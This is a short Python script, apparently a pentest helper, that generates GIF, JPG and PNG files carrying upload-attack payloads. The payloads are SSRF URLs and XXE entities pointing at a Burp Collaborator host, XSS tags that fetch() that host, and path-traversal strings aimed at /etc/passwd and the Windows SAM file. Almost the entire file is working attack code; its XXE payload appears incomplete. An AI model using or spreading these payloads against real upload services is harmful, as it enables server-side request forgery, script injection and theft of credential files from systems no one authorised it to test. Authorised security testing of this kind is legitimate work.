from pathlib import Path
from PIL import Image

def generate_image_payloads(output_dir, ext, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
            f"http://127.0.0.1@{burp_collab}/ssrf3",
        ],
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        ],
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss2')>",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if ext == 'gif':
            gif_header = b'GIF89a'
            gif_trailer = b'\x00;'
            
            for i, payload in enumerate(payloads, 1):
                if vuln == 'xxe':
                    xmp_in_gif = f'''<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>{payload}</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>'''
                    gif_content = gif_header + xmp_in_gif.encode() + gif_trailer
                else:
                    gif_content = gif_header + payload.encode() + gif_trailer
                
                output_file = vuln_dir / f"payload_{i}.gif"
                with open(output_file, 'wb') as f:
                    f.write(gif_content)
        
        elif ext in ['jpg', 'png']:
            img = Image.new('RGB', (100, 100), color='red')
            format_map = {'jpg': 'JPEG', 'png': 'PNG'}
            
            for i, payload in enumerate(payloads, 1):
                img_copy = img.copy()
                output_file = vuln_dir / f"payload_{i}.{ext}"
                img_copy.save(output_file, format_map[ext])
                
                with open(output_file, 'rb') as f:
                    content = f.read()
                
                content_with_payload = content + b'\n' + payload.encode()
                with open(output_file, 'wb') as f:
                    f.write(content_with_payload)

